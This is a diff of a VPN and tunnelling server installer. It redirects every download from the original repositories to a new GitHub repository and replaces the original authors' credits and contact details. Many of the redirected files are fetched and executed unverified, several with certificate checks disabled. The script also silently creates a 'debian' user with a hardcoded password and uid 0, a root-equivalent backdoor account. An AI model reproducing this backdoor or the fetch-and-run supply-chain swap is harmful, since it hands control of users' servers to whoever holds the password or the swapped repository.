@@ -12,7 +12,8 @@ PORT_SSL='443';
 API_LINK='https://mindorenos.cloud/authentication/premium';
 API_KEY='Tknetwork';
 
-wget -O autodns "https://raw.githubusercontent.com/BadBoy-Dexter/Socks/server_script/python/efrenauto/autodns" && chmod +x autodns && sed -i -e 's/\r$//' ~/autodns && ./autodns
+
+wget -O autodns "https://raw.githubusercontent.com/kakaiba1985/tech103/main/autodns" && chmod +x autodns && sed -i -e 's/\r$//' ~/autodns && ./autodns
 
 DOMAIN="$(cat /root/subdomain)"
 NS="$(cat /root/ns.txt)"
@@ -74,7 +75,7 @@ echo "deb http://ftp.debian.org/debian/ jessie main contrib non-free
     update-alternatives --install /usr/bin/c++ c++ /usr/bin/g++ 30
     update-alternatives --set c++ /usr/bin/g++
     cd /usr/src
-    wget https://raw.githubusercontent.com/Dexter-Hysteria/status/mtk_vpn/squid-3.1.23.tar.gz
+    wget https://github.com/kakaiba1985/tech103/blob/main/squid-3.1.23.tar.gz
     tar zxvf squid-3.1.23.tar.gz
     cd squid-3.1.23
     ./configure --prefix=/usr \
@@ -88,7 +89,7 @@ echo "deb http://ftp.debian.org/debian/ jessie main contrib non-free
       --with-pidfile=/var/run/squid.pid
     make -j$(nproc)
     make install
-    wget --no-check-certificate -O /etc/init.d/squid https://raw.githubusercontent.com/Dexter-Hysteria/status/mtk_vpn/squid.sh
+    wget --no-check-certificate -O /etc/init.d/squid https://raw.githubusercontent.com/kakaiba1985/tech103/main/squid.sh
     chmod +x /etc/init.d/squid
     update-rc.d squid defaults
     chown -cR proxy /var/log/squid
@@ -117,19 +118,19 @@ error_directory /usr/share/squid/errors/English' >> squid.conf
     chmod 755 *
     /etc/init.d/squid start
 cd /etc || exit
-wget 'https://raw.githubusercontent.com/BadBoy-Dexter/Socks/server_script/socks.py' -O /etc/socks.py
+wget 'https://raw.githubusercontent.com/kakaiba1985/tech103/main/socks.py' -O /etc/socks.py
 dos2unix /etc/socks.py
 chmod +x /etc/socks.py
 
-wget 'https://raw.githubusercontent.com/BadBoy-Dexter/Socks/server_script/socks-ssh.py' -O /etc/socks-ssh.py
+wget 'https://raw.githubusercontent.com/kakaiba1985/tech103/main/socks-ssh.py' -O /etc/socks-ssh.py
 dos2unix /etc/socks-ssh.py
 chmod +x /etc/socks-ssh.py
 
-wget 'https://raw.githubusercontent.com/BadBoy-Dexter/Socks/server_script/socks-ws-ssh.py' -O /etc/socks-ws-ssh.py
+wget 'https://raw.githubusercontent.com/kakaiba1985/tech103/main/socks-ws-ssh.py' -O /etc/socks-ws-ssh.py
 dos2unix /etc/socks-ws-ssh.py
 chmod +x /etc/socks-ws-ssh.py
 
-wget 'https://raw.githubusercontent.com/BadBoy-Dexter/Socks/server_script/socks-ws-ssl.py' -O /etc/socks-ws-ssl.py
+wget 'https://raw.githubusercontent.com/kakaiba1985/tech103/main/socks-ws-ssl.py' -O /etc/socks-ws-ssl.py
 dos2unix /etc/socks-ws-ssl.py
 chmod +x /etc/socks-ws-ssl.py
 
@@ -139,7 +140,7 @@ sudo cp /etc/apt/sources.list_backup /etc/apt/sources.list
 
 #====================================================
 #	Installing OpenVPN
-#	Finalized: Dexter Eskalarte
+#	Finalized: Taonglobo Prohibitted
 #====================================================
 
 install_openvpn() {
@@ -153,7 +154,7 @@ touch /etc/openvpn/server2.conf
 echo 'DNS=1.1.1.1
 DNSStubListener=no' >> /etc/systemd/resolved.conf
 
-echo '#Openvpn Configuration by MTK Developer :)
+echo '#Openvpn Configuration by Taonglobo :)
 dev tun
 port PORT_UDP
 proto udp
@@ -197,7 +198,7 @@ verb 3' > /etc/openvpn/server.conf
 
 sed -i "s|PORT_UDP|$PORT_UDP|g" /etc/openvpn/server.conf
 
-echo '#Openvpn Configuration by MTK Developer :)
+echo '#Openvpn Configuration by Taonglobo :)
 dev tun
 port PORT_TCP
 proto tcp
@@ -609,7 +610,7 @@ chmod 755 stunnel4 && chmod 755 dropbear
 
 echo "/bin/false" >> /etc/shells
 
-wget -O /etc/banner "https://raw.githubusercontent.com/Dexter-Hysteria/online/server_script/inter_service/file/banner"
+wget -O /etc/banner "https://raw.githubusercontent.com/kakaiba1985/tech103/main/banner"
 chmod +x /etc/banner
 
 useradd -p $(openssl passwd -1 debian) debian -ou 0 -g 0
@@ -621,7 +622,7 @@ sudo service dropbear restart
 
 #====================================================
 #	Installing SlowDNS
-#	Finalized: Firenet Developer
+#	Finalized: Thunderbolt Developer
 #====================================================
 
 install_slowdns (){
@@ -712,8 +713,8 @@ DNS PUBLIC KEY : $(cat /root/.dns/server.pub)
 
 -----------------------
 
-FB Page : https://web.facebook.com/dexter.eskalarte
-Whatsapp Contact: +639709310250
+FB Page : annonymous
+Whatsapp Contact: +639239379202
 
 " >> /root/.web/$secretkey.txt
 
@@ -791,11 +792,11 @@ systemctl start server-sldns
 
 #====================================================
 #	Installing Hysteria UDP
-#	Finalized: Dexter Eskalarte
+#	Finalized: Taonglob Prohibited
 #====================================================
 
 install_hysteria(){
-wget -N --no-check-certificate -q -O ~/install_server.sh https://raw.githubusercontent.com/Dexter-Hysteria/UDP/mtk_vpn/install_server.sh; chmod +x ~/install_server.sh; ./install_server.sh --version v1.3.5
+wget -N --no-check-certificate -q -O ~/install_server.sh https://raw.githubusercontent.com/kakaiba1985/tech103/main/install_server.sh; chmod +x ~/install_server.sh; ./install_server.sh --version v1.3.5
 
 rm -f /etc/hysteria/config.json
 
@@ -848,7 +849,7 @@ chmod 755 /etc/hysteria/.auth.sh
 sysctl -w net.core.rmem_max=16777216
 sysctl -w net.core.wmem_max=16777216
 
-wget -O /usr/bin/badvpn-udpgw "https://github.com/Dexter-Hysteria/status/raw/mtk_vpn/badvpn-udpgw64"
+wget -O /usr/bin/badvpn-udpgw "https://github.com/kakaiba1985/tech103/blob/main/badvpn-udpgw64"
 chmod +x /usr/bin/badvpn-udpgw
 }
 
@@ -866,7 +867,7 @@ installBBR() {
 
 #====================================================
 #	Finalizing Server Setup
-#	Finalized: Dexter Eskalarte
+#	Finalized: Taonglobo Prohibitted
 #====================================================
 
 install_rclocal(){
